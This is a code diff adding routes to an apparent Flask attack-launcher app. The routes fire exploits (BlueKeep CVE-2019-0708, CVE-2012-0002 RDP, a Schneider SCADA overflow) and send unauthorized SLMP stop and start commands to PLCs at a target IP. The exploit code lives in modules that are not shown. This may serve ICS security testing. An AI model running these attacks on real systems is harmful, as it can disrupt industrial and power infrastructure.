@@ -1,8 +1,7 @@
-from flask import Flask, render_template, request, jsonify
+from flask import Flask, render_template, request
 import logging
 from concurrent_log_handler import ConcurrentRotatingFileHandler
-from lib import attack
-from lib import goose
+from lib import attack, goose, bluekeep, slmp
 import socket
 
 
@@ -118,6 +117,13 @@ def execute_malware_passwd():
     return 'OK'
 
 
+@app.route('/attack/cve/2019-0708', methods=['POST'])
+def execute_cve_2019_0708():
+    logger.info('[Exploit: CVE-2019-0708] Exploiting CVE-2019-0708 BlueKeep RDP vunlnerability '
+                + bluekeep.cve_2019_0708(IP_TARGET))
+    return 'OK'
+
+
 @app.route('/attack/cve/2015-5374', methods=['POST'])
 def execute_cve_2015_5374():
     logger.info('[Exploit: CVE-2015-5374] Exploiting Siemens SIPROTEC 4 and SIPROTEC Compact EN100 Ethernet Module '
@@ -132,10 +138,38 @@ def execute_cve_2014_0705():
     return 'OK'
 
 
+@app.route('/attack/cve/2013-0657', methods=['POST'])
+def execute_cve_2013_0657():
+    logger.info('[Exploit: CVE-2013-0657] Exploiting ICS Schneider Electric Interactive Graphical SCADA System Buffer'
+                ' Overflow -2 ' + attack.cve_2013_0657(IP_TARGET))
+    return 'OK'
+
+
+@app.route('/attack/cve/2012-0002', methods=['POST'])
+def execute_cve_2012_0002():
+    logger.info('[Exploit: CVE-2012-0002] Exploiting RDP Microsoft Windows Remote Desktop Protocol Memory Corruption '
+                + attack.cve_2012_0002(IP_TARGET))
+    return 'OK'
+
+
 @app.route('/attack/ied/goose/trip', methods=['POST'])
 def execute_goose_trip():
     logger.info('[GOOSE: Trip] Sending trip command to IED '
                 + goose.ref620_trip())
+    return 'OK'
+
+
+@app.route('/attack/plc/slmp/stop', methods=['POST'])
+def execute_slmp_stop():
+    logger.info('[SLMP: Stop] Sending unauthorized stop command to PLC '
+                + slmp.stop(IP_TARGET))
+    return 'OK'
+
+
+@app.route('/attack/plc/slmp/start', methods=['POST'])
+def execute_slmp_start():
+    logger.info('[SLMP: Start] Sending unauthorized start command to PLC '
+                + slmp.start(IP_TARGET))
     return 'OK'
 
 
